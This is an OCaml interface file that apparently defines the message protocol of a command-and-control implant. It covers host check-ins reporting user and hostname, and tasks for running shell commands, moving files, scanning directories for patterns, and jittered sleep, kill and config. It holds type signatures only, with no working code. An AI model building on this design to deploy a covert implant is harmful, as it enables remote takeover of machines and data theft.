type msg_id = string

type result_status =
  | Ok
  | Error of string

type scan_request = {
  roots : string list;
  patterns : (string * string) list;
  max_depth : int;
  max_file_size : int;
}

type task_op =
  | Shell of string
  | Upload of { path : string; contents : bytes }
  | Download of string
  | Sleep of { interval_s : int; jitter_pct : float }
  | Die
  | Scan of scan_request

type message =
  | Checkin of {
      id : msg_id;
      hostname : string;
      os : string;
      pid : int;
      user : string;
      interval_s : int;
    }
  | TaskResult of {
      id : msg_id;
      task_id : msg_id;
      status : result_status;
      data : bytes;
    }
  | Heartbeat of { id : msg_id }
  | Task of { id : msg_id; op : task_op }
  | Config of {
      id : msg_id;
      interval_s : int option;
      jitter_pct : float option;
      kill : bool;
    }
  | Ack of { id : msg_id; ref_id : msg_id }

val gen_id : unit -> msg_id
val to_msgpck : message -> Msgpck.t
val of_msgpck : Msgpck.t -> (message, string) result
val serialize : message -> string
val deserialize : string -> (message, string) result
